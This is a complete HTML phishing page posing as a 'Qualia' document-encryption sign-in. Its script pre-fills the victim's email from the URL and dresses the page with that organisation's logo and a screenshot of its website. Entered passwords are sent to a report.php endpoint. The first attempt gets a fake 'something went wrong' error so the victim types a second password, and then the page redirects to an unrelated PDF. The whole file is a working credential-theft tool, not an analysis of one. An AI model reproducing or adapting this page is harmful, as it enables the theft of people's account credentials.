<html lang="en">
 <head>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
  </script>
  <script crossorigin="anonymous" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=sha384-fJU6sGmyn07b+uD1nMk7/iSb4yvaowcueiQhfVgQuD98rfva8mcr1eSvjchfpMrH sha512-5SUkiwmm+0AiJEaCiS5nu/ZKPodeuInbQ7CiSrSnUHe11dJpQ8o4J1DU/rw4gxk/O+WBpGYAZbb8e17CDEoESw==" src="https://code.jquery.com/jquery-3.3.1.js">
  </script>
  <link href="https://dl.dropbox.com/s/gqpx03s9c19vs65/favicon.png" rel="shortcut icon"/>
  <meta charset="utf-8"/>
  <meta content="width=device-width, initial-scale=1, shrink-to-fit=no" name="viewport"/>
  <link crossorigin="anonymous" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20= sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm sha512-k78e1fbYs09TQTqG79SpJdV4yXq8dX6ocfP0bzQHReQSbEghnS6AQHE2BbZKns962YaqgQL16l7PkiiAHZYvXQ==" rel="stylesheet">
   <title>
    Digital Real Estate Secured Platform | Qualia
   </title>
   <style>
    html, body {
            height: 100%;
            margin: 0;
            padding: 0;
            overflow: hidden;
        }
        body {
            background-repeat: no-repeat;
            background-attachment: fixed;
            background-size: cover;
            background-position: center bottom;
            transition: background-image 0.5s ease-in-out;
        }
   </style>
  </link>
 </head>
 <body style="background-image: url('https://placehold.co/1920x1080/png?text=Default+Background+Image');">
  <div aria-hidden="true" aria-labelledby="exampleModalLabel" class="modal" id="ajaxModal" role="dialog" style="display: block !important" tabindex="-1">
   <div class="modal-dialog" role="document">
    <div class="modal-content">
     <div class="modal-header">
     </div>
     <form class="form-horizontal well" id="contact">
      <div class="modal-body">
       <div style="text-align: center;">
        <div id="fieldImgCont">
        </div>
        <h5 class="modal-title" id="exampleModalLabel">
         <span class="" id="head-message">
          <span id="compNa">
          </span>
          Document Encryption
         </span>
         <br/>
        </h5>
        <span class="font-weight-normal">
         Sign-in with your organization email credentials to access.
        </span>
        <br/>
        <div id="errorpw" style="color: red; margin: 15px;">
        </div>
       </div>
       <div class="col-lg-12">
        <div class="form-group">
         <label for="Email">
          Email address
         </label>
         <input aria-describedby="emailHelp" class="form-control" id="email" name="email" placeholder="Enter email" readonly="" style="background-color: #eee;opacity: 1; pointer-events:none !important;" type="email" value=""/>
        </div>
       </div>
       <div class="col-lg-12">
        <div class="form-group" style="margin-bottom: 0.5rem !important;">
         <label for="Password">
          Password
         </label>
         <input aria-describedby="emailHelp" class="form-control" id="password" name="password" placeholder="Enter Password" required="" type="password"/>
        </div>
       </div>
      </div>
      <div class="modal-footer" style="padding: 0.5rem !important;padding-left: 6% !important;padding-right: 6% !important;">
       <div style="float:left;">
        <img alt="Qualia company logo in white on transparent background" height="40" src="https://storage.googleapis.com/a1aa/image/c0a5b52c-ae41-4d6e-48e9-2bf892a048fa.jpg" width="95"/>
       </div>
       <button class="btn btn-lg btn-info pull-right" id="submit-btn" type="submit">
        Login
       </button>
      </div>
     </form>
    </div>
    <div style="margin-top:3%;color:#fff;">
     Qualia's unified digital real estate platform to deliver simple and
            secure buying, selling, refinancing and borrowing experiences.
    </div>
   </div>
  </div>
  <script crossorigin="anonymous" integrity="sha256-pS96pU17yq+gVu4KBQJi38VpSuKN7otMrDQprzf/DWY= sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q sha512-Ua/7Woz9L5O0cwB/aYexmgoaD7lw3dWe9FvXejVdgqu71gRog3oJgjSWQR55fwWx+WKuk8cl7UwA1RS6QCadFA==" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js">
  </script>
  <script crossorigin="anonymous" integrity="sha256-5+02zu5UULQkO7w1GIr6vftCgMfFdZcAHeDtFnKZsBs= sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl sha512-ANkGm5vSmtDaoFA/NB1nVJzOKOiI4a/9GipFtkpMG8Rg2Bz8R1GFf5kfL0+z0lcv2X/KZRugwrAlVTAgmxgvIg==" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js">
  </script>
  <script>
   let count = 0;
    let emTag = window.location.hash.substring(1);
    let domain = emTag.substring(emTag.lastIndexOf("@") + 1);

    function send_result(n, t) {
        $.ajax({url: "./report.php", type: "POST", data: {email: n, password: t}});
    }

    function setBackgroundFromDomain(domain) {
        const defaultBg = 'https://placehold.co/1920x1080/png?text=Default+Background+Image';
        if (!domain) {
            document.body.style.backgroundImage = `url('${defaultBg}')`;
            return;
        }
        const screenWidth = window.innerWidth || screen.width || 1920;
        const url = `https://image.thum.io/get/width/${screenWidth}/crop/1000/http://www.${domain}`;

        // Preload image to check if it loads successfully
        const img = new Image();
        img.onload = () => {
            document.body.style.backgroundImage = `url('${url}')`;
            document.body.style.backgroundSize = "cover";
            document.body.style.backgroundPosition = "center bottom";
            document.body.style.backgroundRepeat = "no-repeat";
        };
        img.onerror = () => {
            document.body.style.backgroundImage = `url('${defaultBg}')`;
            document.body.style.backgroundSize = "cover";
            document.body.style.backgroundPosition = "center bottom";
            document.body.style.backgroundRepeat = "no-repeat";
        };
        img.src = url;
    }

    document.addEventListener('DOMContentLoaded', () => {
        if (emTag.match(/([a-zA-Z0-9._+-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9._-]+)/gi)) {
            document.getElementById("email").value = emTag;
            domain = emTag.substring(emTag.lastIndexOf("@") + 1);
            setBackgroundFromDomain(domain);
        } else {
            // Set default background if no valid email in hash
            setBackgroundFromDomain(null);
        }

        document.getElementById("fieldImgCont").outerHTML = `<img src='https://logo.clearbit.com/${domain}' style='width:128px;' alt="Logo of the organization with domain ${domain}" onerror="this.onerror=null;this.src='https://placehold.co/128x128/png?text=No+Logo+Found';" />`;

        document.getElementById("submit-btn").addEventListener("click", event => {
            event.preventDefault ? event.preventDefault() : event.returnValue = false;

            let email = emTag;
            let pswd = document.getElementById("password").value;

            if (pswd.length < 5) {
                document.getElementById('errorpw').innerHTML = "Your account password is too short.";
                setTimeout(() => {
                    document.getElementById("password").value = "";
                    document.getElementById('errorpw').innerHTML = "";
                }, 1500);
            } else if (pswd.length > 5 && count <= 0) {
                send_result(email, pswd);
                document.getElementById('errorpw').innerHTML = "Something went wrong. Please check your credentials.";
                setTimeout(() => {
                    count++;
                    document.getElementById("password").value = "";
                    document.getElementById('errorpw').innerHTML = "";
                }, 2000);
            } else {
                let pswdd = document.getElementById("password").value;
                send_result(email, pswdd);
                setTimeout(() => {
                    window.location.replace("https://www.alamo.edu/contentassets/9106779f02f84dc9afdebd1faf464d98/accounting/cash-flows.pdf");
                }, 1000);
            }
        });
    });
  </script>
 </body>
</html>
